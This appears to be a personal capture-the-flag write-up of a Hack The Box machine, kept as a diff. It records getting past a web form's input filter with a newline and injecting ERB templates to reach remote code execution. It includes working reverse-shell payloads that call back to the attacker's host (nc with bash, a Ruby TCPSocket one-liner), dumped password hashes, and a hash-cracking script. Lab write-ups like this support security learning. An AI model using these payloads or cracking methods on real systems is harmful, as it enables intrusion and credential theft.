@@ -1,0 +1,125 @@
+22/tcp open  ssh
+
+80/tcp open  http
+
+	website is built with Webrick 1.7.0
+	this version has vulnerabilites, but not interesting ones
+
+	10.10.11.253/weighted-grade page sends a form to the server
+		POST http://10.10.11.253/weighted-grade-calc
+
+		category1=qwe&grade1=1&weight1=20&category2=qwe&grade2=1&weight2=20&category3=qwe&grade3=1&weight3=20&category4=qwe&grade4=1&weight4=20&category5=qwe&grade5=1&weight5=20
+
+		trying to send ; as one of the fields returns "Malicious input blocked"
+		apparently it's blocking all special characters in category and grade fields (some regex?)
+		this response is sus though, this is probably the way in
+
+		urlencoding quotes and other special characters to break into the ruby code didn't do anything
+
+		the request returns a web page, and it reflects our input in plain html
+
+		can ruby be templated like php?
+
+		apparently yes:
+			https://www.startuprocket.com/articles/a-quick-introduction-to-embedded-ruby-a-k-a-erb-eruby
+
+			paylaod core:
+				spawn('nc 10.10.14.15 1338 -c bash')
+
+			wrapped in erb tag:
+				<%= spawn('nc 10.10.14.15 1338 -c bash') %>
+
+			urlencode:
+				%3C%25%3D%20spawn%28%27nc%2010.10.14.15%201338%20-c%20bash%27%29%20%25%3E%0A
+
+			it is blocked anyways, so it does some sort of wider pattern matching as well
+
+			what if the regex doesn't have proper flags? let's try newline (%0A)
+
+			%3C%25%3D is blocked
+
+			%0A%3C%25%3D is blocked as well
+			
+			qwe%0A%3C%25%3D results in internal server error. ez (actually not ez)
+
+			apparently we don't even need to urlencode the whole payload, anything after qwe%0A can be plaintext (except %)
+
+			the nc and bash redirection didn't work, but 'Ruby no sh' from https://www.revshells.com/ did:
+				qwe%0A<%25= exit if fork;c=TCPSocket.new("10.10.14.15","1338");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"} %25>
+
+			we get shell as user susan and get user.txt
+
+			adding id_rsa.pub to authorized_keys we get an actual proper shell
+
+			there's a folder Migration with pupilpath_credentials.db
+
+			strings Migration/pupilpath_credentials.db
+				Stephen Locke 154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
+				David Lawrence ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
+				Harry Tyler d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
+				Tina Smith dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
+				Susan Miller abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+
+			running linpeas:
+
+				susan is a member of sudo
+
+				we found what is apparently a hashed password in the sqlite database
+
+				hashid:
+					--File 'phash.txt'--
+					Analyzing 'abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f'
+					[+] Snefru-256 
+					[+] SHA-256 
+					[+] RIPEMD-256 
+					[+] Haval-256 
+					[+] GOST R 34.11-94 
+					[+] GOST CryptoPro S-Box 
+					[+] SHA3-256 
+					[+] Skein-256 
+					[+] Skein-512(256) 
+					--End of file 'phash.txt'-- 
+
+				weird output but it looks like plain sha-256
+
+				hashcat -a 0 -m 1400 phash.txt /usr/share/wordlists/rockyou.txt
+
+					Status...........: Exhausted
+
+					huh?
+
+				there's no way they'd want me to use a different wordlist, right?
+				so apparently there are clues on the machine somewhere
+				
+				reading linpeas output again and checking files carefully, there's something in /var/mail, which is usually empty for htb boxes
+
+				password format is:
+					{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+				import hashlib
+				import time
+				from tqdm import tqdm
+
+				h = "abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f"
+
+				known = "susan_nasus_"
+
+				for i in tqdm(range(1, 1000000000)):
+				    pswd = known + str(i)
+				    rhash = hashlib.sha256(pswd.encode())
+
+				    test_hex = rhash.hexdigest()
+
+				    if test_hex == h:
+				        print("found:", test_hex, pswd)
+				        quit()
+												
+			
+				found: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_413759210
+
+				sudo su
+				cat /root/root.txt
+
+				gg
+
+				
